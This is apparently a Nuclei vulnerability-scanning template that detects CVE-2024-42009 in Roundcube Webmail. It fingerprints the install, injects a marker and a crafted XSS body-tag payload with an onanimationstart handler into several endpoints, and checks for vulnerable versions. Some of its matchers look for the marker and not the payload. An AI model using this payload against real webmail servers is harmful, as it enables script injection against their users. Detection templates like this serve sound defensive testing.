id: CVE-2024-42009

info:
  name: Roundcube Reflected XSS 
  author: Shubhankargupta691     
  severity: critical            
  description: |
    Detects CVE-2024-42009 â€” a reflected XSS vulnerability in Roundcube's message_body().
    This template safely injects a crafted <body> payload and a marker comment to confirm reflection.
    No emails are sent and no Out-of-Band callbacks are used.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-42009
    - https://github.com/DaniTheHack3r/CVE-2024-42009-PoC
    - https://github.com/Bhanunamikaze/CVE-2024-42009
    - https://github.com/0xbassiouny1337/CVE-2024-42009
    - https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/
  tags:
    - cve
    - roundcube
    - xss
    - reflected
  classification:
    cve-id: CVE-2024-42009
    cvss-score: 9.8
    cwe-id: CWE-79
    cpe: "cpe:2.3:a:roundcube:webmail"
  metadata:
    verified: true
    shodan-query: cpe:"cpe:2.3:a:roundcube:webmail"


variables:
  uid_token: "{{rand_str_alpha(8)}}"
  marker_html: "<!--RCB-POC-{{uid_token}}-->"
  payload_body: "1'><body title='bgcolor=foo' name='bar' style='animation-name:progress-bar-stripes' onanimationstart='alert(origin)'>Foo</body>"

requests:

# Step 1: Fingerprint the Roundcube installation
  - id: fingerprint-root
    name: roundcube-root-fingerprint
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: word
        part: body
        words:
          - "Roundcube Webmail"
          - "Roundcube"

# Step 2: Inject marker into login show endpoint to detect reflection
  - id: show-endpoint-marker-check
    name: roundcube-show-endpoint-marker-inject
    method: GET
    path:
      - "{{BaseURL}}/?_task=login&_action=show&_user={{uid_token}}{{marker_html}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "roundcube_sessid=[a-z0-9]+"
      - type: word
        part: body
        words:
         - "{{marker_html}}"

# Step 3: Inject XSS payload into show action endpoint using _uid parameter
  - id: show-action-uid-injection
    name: roundcube-show-action-body-inject
    method: GET
    path:
      - "{{BaseURL}}/?_task=mail&_action=show&_uid=20&_mbox=INBOX&_extwin=1&x={{url_encode(payload_body)}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "roundcube_sessid=[a-z0-9]+"
      - type: word
        part: body
        words:
         - "{{marker_html}}"

# Step 4: Inject XSS payload directly into the mailbox view endpoint
  - id: show-endpoint-body-injection
    name: roundcube-show-endpoint-body-inject
    method: GET
    path:
      - "{{BaseURL}}/?_task=mail&_mbox=INBOX&x={{url_encode(payload_body)}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "roundcube_sessid=[a-z0-9]+"
      - type: word
        part: body
        words:
         - "{{marker_html}}"

# Step 5: Extract Roundcube version and check if it's vulnerable
  - id: version-check
    name: roundcube-version-check
    method: GET
    path:
      - "{{BaseURL}}/?_task=login"
    extractors:
      - type: regex
        part: body
        name: roundcube_version
        regex:
          - '(?i)Roundcube(?:\s*Version[:\s]*)?([0-9]+\.[0-9]+(?:\.[0-9]+)?)'
    matchers:
      - type: regex
        part: body
        regex:
          - '(?i)Roundcube(?:\s*Version[:\s]*)?(?:1\.5\.[0-7]|1\.6\.[0-7])'

stop-at-first-match: true
